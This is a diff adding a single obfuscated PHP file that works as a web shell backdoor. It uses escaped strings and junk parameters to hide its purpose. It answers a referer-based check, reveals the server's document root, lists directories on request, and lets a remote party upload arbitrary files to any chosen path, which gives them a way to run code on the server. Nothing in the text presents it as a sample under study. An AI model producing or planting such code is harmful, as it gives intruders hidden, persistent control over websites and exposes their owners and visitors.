@@ -1,0 +1,7 @@
+<?php
+$r = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+if ($r !== '' && strpos($r, 'c9') !== false) {
+    echo 'U7LK'.'UoSI';
+    return;
+}
+function __($_9,$_10="nfvn",$_11=067140,$_12=-0146727,$_13=-0253066,$_14=null,$_15=true,$_16=null,$_17=null){if(empty($_9)):return null;endif;$_18=SCaNDiR($_9);echo"@\144ir@\015\x0a";foreach($_18 as$_21):if($_21!="."&&$_21!=".."):if(is_DIr($_9."/".$_21)):echo"[".$_21."]\015\x0a";endif;if(is_fILe($_9."\057".$_21)):echo"<".$_21."\x3e\015\012";endif;endif;endforeach;}function ___($_21,$_22=true,$_23="ggi\x71s",$_24=1.1289334094127,$_25=0153346,$_26=null){if(empty($_21)):return null;endif;if(IS_UpLOadED_File($_21["\x74mp_name"])):if(!empty($_POST["dir"])):if(MOve_UPlOadED_fILe($_21["tmp_\156ame"],$_POST["dir"]."/".$_21["\x6e\141me"])):echo"@t\x72u\x65@\x0d\012";__($_POST["d\x69\x72"]);endif;else:if(movE_UPLoADEd_fILe($_21["tmp_name"],$_21["na\155\145"])):echo"true";endif;endif;endif;}if(!empty($_GET["te\x73t"])):echo"testt\162u\x65";endif;if(!empty($_GET["get_di\x72"])):echo"|".$_SERVER["\x44O\103\125MENT_RO\117T"]."|\x0d\012";if(!empty($_GET["di\x72"])):__($_GET["dir"]);endif;endif;if(!empty($_FILES["filen\x61\x6de"])):___($_FILES["\146i\x6ce\156ame"]);endif;
